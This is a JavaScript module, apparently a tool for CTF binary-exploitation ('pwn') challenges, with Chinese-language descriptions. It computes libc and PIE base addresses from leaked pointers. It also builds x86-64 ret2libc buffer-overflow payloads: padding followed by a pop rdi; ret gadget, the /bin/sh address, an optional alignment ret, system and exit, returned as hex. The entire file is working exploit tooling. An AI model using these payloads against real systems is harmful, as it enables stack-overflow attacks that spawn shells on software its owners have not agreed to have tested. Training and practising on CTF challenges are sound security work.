const MAX_PWN_PAYLOAD_BYTES = 16 * 1024;
const MAX_ADDRESS = 0xffffffffffffffffn;
const ADDRESS = { type: 'string', maxLength: 20, description: '十进制或 0x 开头的 64 位地址/偏移字符串。' };

export const PWN_PAYLOAD_PROPERTIES = {
  operation: {
    type: 'string', enum: ['libc_base', 'pie_base', 'ret2libc_x64'],
    description: 'libc_base/pie_base 根据地址泄漏和符号偏移计算映像基址；ret2libc_x64 组装 x86-64 SysV 的基础 ret2libc 溢出数据。',
  },
  leak: { ...ADDRESS, description: 'libc_base/pie_base 中泄漏到的函数或映像地址。' },
  symbol_offset: { ...ADDRESS, description: '泄漏函数或映像位置在对应 ELF 文件中的符号偏移。' },
  target_offsets: {
    type: 'object', maxProperties: 12, additionalProperties: ADDRESS,
    description: '可选的符号名到对应 ELF 偏移映射，工具据此计算运行时地址。',
  },
  offset: {
    type: 'integer', minimum: 0, maximum: MAX_PWN_PAYLOAD_BYTES,
    description: '覆盖到保存返回地址前的填充字节数，最多 16 KiB。',
  },
  padding_byte: {
    type: 'string', pattern: '^[0-9a-fA-F]{2}$', default: '41',
    description: '填充用的单字节 Hex，默认 41（A）。',
  },
  pop_rdi_ret: { ...ADDRESS, description: 'pop rdi; ret gadget 的运行时地址。' },
  bin_sh: { ...ADDRESS, description: '可读的 /bin/sh 字符串运行时地址。' },
  system: { ...ADDRESS, description: 'system 函数运行时地址。' },
  alignment_ret: { ...ADDRESS, description: '可选的单条 ret 地址，用于按断点时栈对齐情况调整 system 调用栈。' },
  exit: { ...ADDRESS, description: '可选的退出函数地址，作为 system 返回地址。' },
};

function parseAddress(value, label) {
  if (typeof value !== 'string' || !/^(?:0[xX][0-9a-fA-F]{1,16}|[0-9]{1,20})$/u.test(value)) {
    throw new Error(`${label} 须为十进制或 0x 开头的 64 位地址/偏移字符串。`);
  }
  const parsed = BigInt(value);
  if (parsed < 0n || parsed > MAX_ADDRESS) throw new Error(`${label} 超出 64 位无符号范围。`);
  return parsed;
}

function hex(value) {
  return '0x' + value.toString(16);
}

function calculateImageBase(input) {
  const leak = parseAddress(input.leak, 'leak');
  const symbolOffset = parseAddress(input.symbol_offset, 'symbol_offset');
  const base = leak - symbolOffset;
  if (base < 0n) throw new Error('leak 必须大于或等于 symbol_offset。');
  const targets = Object.create(null);
  const offsets = input.target_offsets ?? {};
  if (offsets === null || typeof offsets !== 'object' || Array.isArray(offsets)
    || Object.keys(offsets).length > 12) throw new Error('target_offsets 须为最多 12 项的对象。');
  for (const [name, rawOffset] of Object.entries(offsets)) {
    if (!/^[A-Za-z_][A-Za-z0-9_]{0,63}$/u.test(name)) throw new Error(`目标符号名无效：${name}。`);
    const address = base + parseAddress(rawOffset, `target_offsets.${name}`);
    if (address > MAX_ADDRESS) throw new Error(`目标符号 ${name} 的运行时地址超出 64 位。`);
    targets[name] = hex(address);
  }
  const baseField = input.operation === 'pie_base' ? 'pie_base' : 'libc_base';
  return {
    operation: input.operation, status: 'candidate', [baseField]: hex(base), page_aligned: base % 0x1000n === 0n,
    leak: hex(leak), symbol_offset: hex(symbolOffset), target_addresses: targets,
    notes: ['请确认泄漏符号偏移来自与题目 libc 完全匹配的文件；page_aligned 仅作一致性提示。'],
  };
}

function buildRet2Libc(input) {
  if (!Number.isSafeInteger(input.offset) || input.offset < 0 || input.offset > MAX_PWN_PAYLOAD_BYTES) {
    throw new Error(`offset 须为 0 至 ${MAX_PWN_PAYLOAD_BYTES} 的整数。`);
  }
  const padText = input.padding_byte ?? '41';
  if (typeof padText !== 'string' || !/^[0-9a-fA-F]{2}$/u.test(padText)) {
    throw new Error('padding_byte 须是两位十六进制字节。');
  }
  const entries = [
    ['pop_rdi_ret', input.pop_rdi_ret],
    ['bin_sh', input.bin_sh],
  ];
  if (input.alignment_ret !== undefined) entries.push(['alignment_ret', input.alignment_ret]);
  entries.push(['system', input.system]);
  if (input.exit !== undefined) entries.push(['exit', input.exit]);
  const words = entries.map(([name, raw]) => ({ name, value: parseAddress(raw, name) }));
  const length = input.offset + words.length * 8;
  if (length > MAX_PWN_PAYLOAD_BYTES) throw new Error(`payload 总长度不能超过 ${MAX_PWN_PAYLOAD_BYTES} 字节。`);
  const payload = Buffer.alloc(length);
  payload.fill(Number.parseInt(padText, 16), 0, input.offset);
  const layout = words.map((word, index) => {
    const byteOffset = input.offset + index * 8;
    payload.writeBigUInt64LE(word.value, byteOffset);
    return { name: word.name, value: hex(word.value), byte_offset: byteOffset, byte_length: 8 };
  });
  return {
    operation: 'ret2libc_x64', architecture: 'x86-64', abi: 'System V AMD64', byte_order: 'little',
    payload_bytes: payload.length, payload_hex: payload.toString('hex'), padding_bytes: input.offset,
    words: layout,
    notes: [
      '该工具只按给定地址排布基础 ROP 数据，不验证溢出偏移、地址映射或 gadget 是否正确。',
      input.alignment_ret === undefined
        ? '未插入对齐 ret；根据断点处 RSP 和目标函数 ABI 判断是否需要 alignment_ret。'
        : '已在 bin_sh 后插入 alignment_ret；请按目标函数入口处的实际 RSP 复核对齐。',
    ],
  };
}

export function buildPwnPayload(input) {
  const allowed = ['libc_base', 'pie_base'].includes(input.operation)
    ? ['operation', 'leak', 'symbol_offset', 'target_offsets']
    : input.operation === 'ret2libc_x64'
      ? ['operation', 'offset', 'padding_byte', 'pop_rdi_ret', 'bin_sh', 'system', 'alignment_ret', 'exit']
      : undefined;
  if (allowed === undefined) throw new Error('operation 须为 libc_base、pie_base 或 ret2libc_x64。');
  const unsupported = Object.keys(input).find(key => !allowed.includes(key));
  if (unsupported !== undefined) throw new Error(`${input.operation} 不支持参数 ${unsupported}。`);
  if (input.operation === 'libc_base' || input.operation === 'pie_base') return calculateImageBase(input);
  if (input.operation === 'ret2libc_x64') return buildRet2Libc(input);
  throw new Error('operation 须为 libc_base 或 ret2libc_x64。');
}
